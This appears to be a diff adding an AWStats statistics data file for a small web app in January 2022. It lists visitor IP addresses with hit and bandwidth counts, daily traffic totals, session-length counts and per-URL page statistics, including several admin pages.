+3.145.135.127 1 1 60321 20220113093546
+192.241.217.104 1 1 60568 20220105191627
+27.184.93.215 0 1 2621 
+71.6.232.7 2 2 120894 20220111053214
+162.158.179.200 0 1 458573 
+205.185.116.25 1 3 185275 20220111093327
+141.101.76.175 1 1 60049 20220111223616
+34.77.162.7 1 1 61409 20220110222134
+162.158.179.29 0 6 370620 
+34.77.162.2 1 1 38092 20220107105257
+172.68.254.131 0 6 34536 
+223.166.75.79 0 1 2621 
+162.158.178.164 0 6 772818 
+172.70.134.79 1 1 60321 20220107204506
+192.241.208.88 1 1 60568 20220102174436
+162.158.178.199 0 1 52935 
+195.144.21.56 1 2 71563 20220107191200
+162.158.179.222 0 1 28521 
+141.101.69.232 1 1 60568 20220104214948
+103.22.201.147 0 1 8845 
+103.114.158.1 0 2 32254 
+162.158.179.125 0 2 13270 
+172.68.254.37 2 2 193504 20220106123351
+172.70.210.113 0 1 966 
+92.118.160.33 1 1 60321 20220112025600
+172.68.253.27 0 1 4332 
+172.70.211.112 0 1 128803 
+162.158.119.148 0 2 12879 
+172.70.34.197 1 1 60321 20220111134225
+162.158.106.177 2 2 120592 20220105021507
+168.138.79.162 1 1 60321 20220110001752
+162.142.125.42 2 2 120788 20220114040346
+172.70.219.30 0 1 159839 
+88.0.214.160 1 1 60568 20220101070549
+192.241.219.162 1 1 60321 20220110010403
+172.70.82.131 0 1 89729 
+209.141.51.222 0 2 7450 
+162.158.179.129 0 2 187274 
+172.70.210.227 0 1 89729 
+162.158.179.9 0 6 374862 
+164.52.24.162 2 2 121136 20220106022027
+45.79.204.46 1 1 60321 20220111141305
+172.70.82.71 0 1 966 
+172.70.82.25 0 1 64660 
+172.68.254.19 0 1 234268 
+172.68.253.69 0 1 35563 
+172.70.130.89 1 1 60296 20220102180256
+71.6.167.142 1 2 71563 20220113083312
+162.158.119.142 0 1 28521 
+162.158.179.144 0 1 81164 
+162.158.178.219 0 5 1159425 
+34.96.130.11 1 1 60432 20220104041928
+162.158.178.254 2 2 61474 20220107073146
+221.131.2.4 0 2 163030 
+162.158.129.81 1 1 60049 20220107233559
+108.162.245.19 1 1 60566 20220102142120
+162.158.178.210 2 2 158888 20220106123350
+172.68.91.133 0 16 637177 
+160.116.22.21 1 2 71810 20220106045928
+92.118.160.9 1 1 61409 20220110063356
+172.70.211.120 0 1 41505 
+162.158.106.207 1 1 60049 20220108163105
+108.162.245.131 3 3 180886 20220105020739
+167.94.138.41 3 3 181149 20220110194530
+172.68.253.57 0 1 159839 
+34.96.130.29 2 2 76208 20220112045549
+108.162.246.74 1 1 60235 20220107031818
+64.225.75.232 3 3 181460 20220114002110
+205.185.116.89 1 3 67427 20220111093336
+162.158.179.254 0 6 521562 
+183.136.225.42 2 4 143373 20220113022152
+172.68.253.45 1 1 60049 20220113043758
+193.118.55.170 1 1 60568 20220104203643
+167.248.133.42 1 1 60321 20220114024925
+167.248.133.116 1 1 60568 20220101064646
+193.118.53.202 4 4 241717 20220114053137
+172.69.68.213 1 1 60565 20220103000631
+172.70.210.231 0 1 28521 
+162.158.179.219 2 4 237934 20220106125414
+103.22.201.135 0 2 250371 
+172.70.82.49 0 1 231885 
+192.241.195.173 1 1 60573 20220101174322
+162.158.179.187 0 2 9448 
+192.241.216.206 1 1 60321 20220108220751
+34.86.35.10 1 1 38092 20220112042559
+128.14.141.34 4 4 242020 20220109033154
+172.68.253.53 1 1 60296 20220106083000
+209.141.36.231 0 2 173854 
+162.158.74.152 1 1 60296 20220102180256
+162.142.125.57 1 1 60321 20220111030653
+143.110.243.141 1 1 60321 20220108221215
+162.158.106.225 1 1 60296 20220104025058
+162.158.179.33 0 8 28200 
+192.241.210.128 1 1 60568 20220104183150
+162.158.90.249 1 1 60049 20220110003528
+108.162.237.119 2 2 120352 20220108014802
+162.158.107.52 1 1 60235 20220107031744
+121.46.25.189 0 1 11242 
+152.32.135.231 1 1 38137 20220109235040
+172.70.82.31 0 2 8049 
+108.162.246.70 1 1 60049 20220108163106
+162.158.129.115 1 1 60049 20220107233601
+192.241.219.156 1 1 60507 20220106192119
+51.254.49.100 1 1 60321 20220107185349
+175.152.108.240 0 1 160409 
+171.37.207.16 0 1 160409 
+162.221.192.90 1 1 60568 20220106014927
+172.70.210.51 1 1 12900 20220109183512
+172.70.82.141 0 1 28521 
+34.96.130.7 1 1 60185 20220108035151
+162.158.179.100 0 1 1085 
+172.70.210.11 0 1 18486 
+172.69.68.168 1 1 60289 20220103044558
+162.158.178.17 0 2 1522368 
+162.158.179.146 0 2 117156 
+104.248.129.44 1 1 60565 20220102115015
+172.70.82.249 0 2 65091 
+162.158.178.212 0 1 3733 
+205.185.117.203 0 2 14563 
+23.251.102.74 2 2 120889 20220114041432
+103.22.201.143 1 2 96014 20220111081425
+162.158.106.41 1 1 60294 20220102142120
+172.70.82.51 0 1 8845 
+162.158.119.136 0 1 41751 
+167.248.133.44 1 1 60568 20220105042803
+172.68.144.46 1 1 0 20220105102613
+185.180.143.138 1 1 60507 20220106094152
+220.181.178.183 0 1 160409 
+192.241.215.36 1 1 10176 20220104235424
+34.96.130.13 1 1 60636 20220105030057
+192.241.211.103 1 1 60568 20220105015104
+45.124.66.24 2 2 120642 20220111151718
+172.70.210.149 1 1 84772 20220109183512
+80.82.77.192 1 1 60573 20220102194806
+192.241.217.154 1 1 60321 20220107220501
+172.70.135.108 1 1 60049 20220111044113
+23.91.96.133 1 1 38112 20220109235040
+118.193.32.180 1 2 71563 20220109234641
+23.250.19.242 1 2 71810 20220106065349
+164.90.197.27 1 1 60321 20220111230335
+172.68.253.248 0 1 966 
+162.158.179.63 4 4 122802 20220107102255
+141.101.104.242 1 1 33352 20220111223612
+192.241.214.249 1 1 60321 20220112063744
+172.70.82.219 0 1 3733 
+162.158.119.124 0 1 86927 
+185.173.35.5 1 1 60321 20220107191407
+175.152.110.203 0 1 2621 
+172.70.210.89 0 1 34163 
+172.70.210.181 0 2 90644 
+172.70.218.189 3 3 12560 20220109131453
+162.158.119.98 1 1 96752 20220111081425
+209.141.33.65 0 1 18486 
+112.66.107.65 0 1 2621 
+192.241.217.189 1 1 60321 20220111055222
+162.158.178.250 0 2 3784 
+183.136.226.3 3 5 203633 20220110000558
+172.68.253.73 0 8 923322 
+172.68.253.35 0 2 8258 
+167.248.133.43 1 1 60321 20220109061816
+162.221.192.26 4 4 242209 20220106094726
+162.142.125.44 1 1 60568 20220104121153
+172.70.82.89 0 1 62477 
+172.68.253.61 0 7 103470 
+213.32.122.82 1 1 60507 20220106101413
+185.142.236.41 1 1 60563 20220101202918
+162.158.106.129 1 1 60321 20220108163106
+128.1.248.42 1 1 60321 20220107085225
+162.158.119.128 0 1 34163 
+162.158.178.63 2 2 25800 20220106123351
+92.118.160.1 2 2 76196 20220110203605
+162.158.119.130 0 1 41505 
+162.158.178.146 2 4 85896 20220106132441
+162.158.179.212 0 1 363503 
+172.70.211.26 0 1 4332 
+108.162.246.146 1 1 60566 20220102142121
+71.6.199.23 1 2 71808 20220102025655
+108.162.246.100 2 2 120589 20220102142121
+60.13.7.73 0 1 2621 
+172.70.210.221 0 1 153357 
+45.137.23.241 1 1 60321 20220107104916
+103.237.101.15 1 2 71563 20220109074951
+119.78.65.175 0 1 160409 
+172.70.130.251 1 1 60049 20220113205236
+172.70.211.154 0 1 61770 
+162.158.179.15 0 6 171126 
+103.22.201.169 0 1 61770 
+128.14.133.58 3 3 181642 20220107003216
+162.158.178.185 0 2 6274 
+45.33.96.205 1 1 60321 20220110131346
+172.70.211.108 0 1 231885 
+124.227.31.185 0 1 2621 
+142.93.163.195 1 1 60253 20220109045934
+172.70.86.66 1 1 60321 20220108172838
+172.70.211.34 0 1 9146 
+128.1.248.26 3 3 181461 20220113102614
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 14
+20220101 22 25 1484658 22
+20220102 28 29 1659954 27
+20220103 47 53 3115798 21
+20220104 31 31 1610954 26
+20220105 25 27 1452710 24
+20220106 215 348 17465298 60
+20220107 38 61 3187320 33
+20220108 34 77 4159882 29
+20220109 30 81 4172846 23
+20220110 27 70 3629751 20
+20220111 30 82 4009729 28
+20220112 13 13 740077 12
+20220113 18 42 2157579 16
+20220114 20 20 1206770 8
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 6
+30mn-1h 11
+2mn-5mn 3
+15mn-30mn 2
+30s-2mn 6
+5mn-15mn 4
+0s-30s 322
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 25 first Pages must be first (order not required for others)
+BEGIN_SIDER 49
+/ 345 20339108 277 267
+/placeholder-image/350x300 51 216750 0 3
+/assets/templates/basic/frontend/css/color.php 45 57555 4 23
+/admin/frontend/frontend-sections/banner 14 1026362 5 0
+/index.php 14 850818 14 7
+/assets/templates/basic/frontend/fonts/la-solid-900.woff2 10 967520 7 9
+/assets/templates/basic/frontend/fonts/la-regular-400.woff2 10 129000 8 10
+/assets/templates/basic/frontend/fonts/la-brands-400.woff2 10 847720 9 8
+/admin/seo 9 460681 1 0
+/admin/dashboard 6 492552 1 0
+/register 5 167563 4 2
+/login 5 50581 2 2
+/admin/frontend/frontend-sections/app 4 225141 1 0
+/user/dashboard 3 81398 1 0
+/admin 3 17705 1 0
+/placeholder-image/undefined 3 5373 0 0
+/assets/admin/fonts/la-brands-400.woff2 2 169544 2 2
+/assets/admin/webfonts/fa-solid-900.woff2 2 158888 2 2
+/assets/admin/fonts/la-solid-900.woff2 2 193504 2 2
+/assets/admin/webfonts/fa-regular-400.woff2 2 27168 2 2
+/assets/admin/fonts/la-regular-400.woff2 2 25800 2 2
+/admin/trade/log 2 99140 0 0
+/admin/email-template/global 2 101235 0 0
+/user/authorization 2 19978 0 0
+/admin/frontend/manage-pages 1 53695 0 0
+/admin/gateway/automatic 1 94460 0 0
+/admin/frontend/frontend-sections/trade 1 53035 0 0
+/admin/email-template/index 1 64954 0 0
+/index.php/admin 1 5852 1 1
+/assets/templates/basic/user/fonts/la-solid-900.woff2 1 96752 1 1
+/issmall/ 1 12269 0 0
+/placeholder-image/728x465 1 10714 0 0
+/admin/frontend/frontend-sections/breadcrumb 1 52573 0 0
+/admin/losing/trade/log 1 48306 0 0
+/test_404_page/ 1 12269 0 0
+/admin/frontend/frontend-sections/call 1 52062 0 0
+/assets/templates/basic/frontend/js/bootstrap.min.js.map 1 194435 0 1
+/assets/templates/basic/user/fonts/la-regular-400.woff2 1 12900 1 1
+/data%3Aimage/x-icon%3Bbase64%2CAAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC%2B8MW%2B3z%2B9/l6l2383xH%2BiSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1%2Bw/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2%2B1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou%2Bf6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m%2BRncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL%2BmZE18e36IWiHLkFocqzW9QXcNz1%2BwUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD%2B/p6dJDknzX%2B05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX%2BDPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC 1 12364 0 1
+/admin/frontend/frontend-element/banner/42 1 51144 0 0
+/assets/templates/basic/user/fonts/la-brands-400.woff2 1 84772 1 1
+/admin/frontend/frontend-sections/blog 1 76477 0 0
+/placeholder-image/800x800 1 16675 0 1
+/placeholder-image/1000x562 1 17369 0 0
+/admin/draw/trade/log 1 48300 0 0
+/admin/frontend/frontend-sections/trend 1 51395 0 0
+/admin/frontend/frontend-sections/social_icon 1 65211 0 0
+/admin/wining/trade/log 1 49586 0 0
+/admin/users/email-unverified 1 48515 0 0
+END_SIDER
